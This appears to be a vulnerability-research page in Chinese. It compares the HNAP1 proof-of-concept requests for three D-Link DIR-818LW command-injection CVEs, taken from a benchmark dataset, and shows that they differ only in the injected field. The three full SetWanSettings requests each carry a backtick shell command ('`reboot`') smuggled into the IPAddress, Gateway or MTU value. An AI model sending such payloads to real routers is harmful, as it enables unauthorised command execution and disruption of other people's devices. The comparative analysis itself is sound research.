---
layout: default
permalink: /DIR-818LW.html
title: DIR-818LW PoC 大块彩色对照
date: 2026-09-15
firmware: DIR-818LW
source_note: "../../DIR-818LW.md"
tags:
  - IoT漏洞挖掘
  - CVE
  - PoC相似性
---

# DIR-818LW PoC 大块彩色对照

> [!warning] 固件归属
> 三条 CVE 的漏洞归属是 **DIR-818LW**（NVD + TeamSeri0us 原始 PDF 一致），但下方请求实际抓自 **BM-2024-00083 = DIR-823G v1.0.2B05** 镜像，不是 818LW。三条彼此之间的相似性成立（同一镜像、同一 SetWanSettings XML）；但“同固件”严格来说只到 B05 镜像这一层，不能据此断言 818LW 上的行为。复现直接用 BM-2024-00083 容器即可。
> 证据等级均为“基准数据集抓包请求（非原始公开 PoC）”；NVD 原始引用的 TeamSeri0us PDF 已在各自来源行列出。

## <span style="color:#b91c1c;font-size:1.15em;font-weight:700">A 级：CVE-2019-12786 ↔ CVE-2019-12787 ↔ CVE-2019-13481</span>

<span style="color:#17803d;font-weight:700">绿色文字/边框：原始请求的大部分骨架完全相同。</span>　<span style="color:#c2410c;font-weight:700">橙色文字标注：原请求中实际变化的字段。</span>

### <span style="color:#b91c1c">A 级：CVE-2019-12786 ↔ CVE-2019-12787</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-12786</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br><span style="color:#64748b;font-weight:700">证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</span></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 1032</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.9</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate, br</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: keep-alive</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<span style="color:#c2410c;font-weight:700">&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</span>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">差异高亮：注入位置是 IPAddress。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-12787</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12787/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-2-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12787" target="_blank">NVD ↗</a><br><span style="color:#64748b;font-weight:700">证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</span></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 1032</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.9</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate, br</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: keep-alive</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;<span style="color:#c2410c;font-weight:700">&lt;Gateway&gt;'`reboot`'&lt;/Gateway&gt;</span>&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">差异高亮：注入位置是 Gateway。</div>
</td>
</tr>
</table>

### <span style="color:#b91c1c">A 级：CVE-2019-12786 ↔ CVE-2019-13481</span>

<table style="width:100%;table-layout:fixed;border-collapse:separate;border-spacing:10px;">
<tr>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-12786</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-12786/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12786" target="_blank">NVD ↗</a><br><span style="color:#64748b;font-weight:700">证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</span></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 1032</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.9</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate, br</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: keep-alive</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;&lt;MTU&gt;1400&lt;/MTU&gt;&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;<span style="color:#c2410c;font-weight:700">&lt;IPAddress&gt;'`reboot`'&lt;/IPAddress&gt;</span>&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">差异高亮：完整原始 XML 见下方链接；注入字段是 IPAddress。</div>
</td>
<td style="width:50%;vertical-align:top;border:3px solid #17803d;background:#f7fff8;padding:12px;">
<strong>CVE-2019-13481</strong>
<div style="font-size:0.9em;margin:4px 0 8px;">原始来源：<a href="https://raw.githubusercontent.com/a101e-lab/IoTVulBench/main/Vulnerabilities/CVE-2019-13481/BM-2024-00083-payload.seed" target="_blank">IoTVulBench payload.seed ↗</a>；<a href="https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/dir818-3-protected.pdf" target="_blank">NVD 原始引用 PDF ↗</a>；<a href="https://nvd.nist.gov/vuln/detail/CVE-2019-13481" target="_blank">NVD ↗</a><br><span style="color:#64748b;font-weight:700">证据等级：基准数据集抓包请求（非原始公开 PoC）；IoTVulBench 将该 CVE 挂在 BM-2024-00083（DIR-823G B05）仿真环境，请求抓自该镜像；本地无 DIR-818LW 固件，未在其上验证。</span></div>
<pre style="font-family:Consolas,'Courier New',monospace;white-space:pre-wrap;overflow-wrap:anywhere;word-break:break-all;overflow-x:auto;line-height:1.35;margin-top:10px;">
<span style="color:#17803d">POST /HNAP1/ HTTP/1.1</span>
<span style="color:#17803d">Host: TARGET_HOST:PORT</span>
<span style="color:#17803d">Content-Length: 1028</span>
<span style="color:#17803d">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36</span>
<span style="color:#17803d">SOAPAction: "http://purenetworks.com/HNAP1/GetWanCurrentStatus"</span>
<span style="color:#17803d">X-Requested-With: XMLHttpRequest</span>
<span style="color:#17803d">HNAP_AUTH: &lt;GENERATE_HNAP_AUTH&gt;</span>
<span style="color:#17803d">Accept: */*</span>
<span style="color:#17803d">Content-Type: text/xml; charset=UTF-8</span>
<span style="color:#17803d">Accept-Language: en-US,en;q=0.9</span>
<span style="color:#17803d">Origin: http://TARGET_HOST:PORT</span>
<span style="color:#17803d">Referer: http://TARGET_HOST:PORT/</span>
<span style="color:#17803d">Accept-Encoding: gzip, deflate, br</span>
<span style="color:#17803d">Cookie: &lt;SESSION_COOKIE&gt;</span>
<span style="color:#17803d">Connection: keep-alive</span>
&nbsp;
<span style="color:#17803d">&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;&lt;soap:Body&gt;&lt;SetWanSettings xmlns="http://purenetworks.com/HNAP1/"&gt;&lt;Type&gt;DHCP&lt;/Type&gt;&lt;PppoeType&gt;&lt;Username&gt;&lt;/Username&gt;&lt;Password&gt;&lt;/Password&gt;&lt;MaxIdleTime&gt;0&lt;/MaxIdleTime&gt;&lt;/PppoeType&gt;<span style="color:#c2410c;font-weight:700">&lt;MTU&gt;'`reboot`'&lt;/MTU&gt;</span>&lt;HostName&gt;&lt;/HostName&gt;&lt;ServiceName&gt;&lt;/ServiceName&gt;&lt;AutoReconnect&gt;false&lt;/AutoReconnect&gt;&lt;IPAddress&gt;&lt;/IPAddress&gt;&lt;SubnetMask&gt;&lt;/SubnetMask&gt;&lt;Gateway&gt;&lt;/Gateway&gt;&lt;DnsManual&gt;false&lt;/DnsManual&gt;&lt;MacCloneEnable&gt;false&lt;/MacCloneEnable&gt;&lt;CloneMacAddress&gt;&lt;/CloneMacAddress&gt;&lt;MacCloneType&gt;&lt;/MacCloneType&gt;&lt;WanSpeed&gt;Auto&lt;/WanSpeed&gt;&lt;WanDuplex&gt;Auto&lt;/WanDuplex&gt;&lt;ConfigDNS&gt;&lt;Primary&gt;&lt;/Primary&gt;&lt;Secondary&gt;&lt;/Secondary&gt;&lt;/ConfigDNS&gt;&lt;MacAddress&gt;&lt;/MacAddress&gt;&lt;VPNServerIPAddress&gt;&lt;/VPNServerIPAddress&gt;&lt;VPNLocalIPAddress&gt;&lt;/VPNLocalIPAddress&gt;&lt;VPNLocalSubnetMask&gt;&lt;/VPNLocalSubnetMask&gt;&lt;VPNLocalGateway&gt;&lt;/VPNLocalGateway&gt;&lt;/SetWanSettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span>
</pre>
<div style="color:#c2410c;font-weight:700;margin-top:10px;">差异高亮：Content-Length 变为 1028，注入字段是 MTU。</div>
</td>
</tr>
</table>

## 三条请求的判定

<span style="color:#b91c1c;font-weight:700">几乎完全重复。</span> 共同部分是 `/HNAP1/`、`SetWanSettings`、DHCP XML 和 ``'&#96;reboot&#96;'``；变化只发生在 `IPAddress`、`Gateway`、`MTU` 三个业务字段。

完整原始请求：[CVE-2019-12786](#CVE-2019-12786)、[CVE-2019-12787](#CVE-2019-12787)、[CVE-2019-13481](#CVE-2019-13481)。

> [!note] HNAP1 抓包字段说明
> 三条 seed 的 SOAPAction 均为 GetWanCurrentStatus，而请求 Body 为 SetWanSettings；这是 seed 原文中的抓包特征，本页按原文保留，没有把它改写成看似更规范的 SOAPAction。
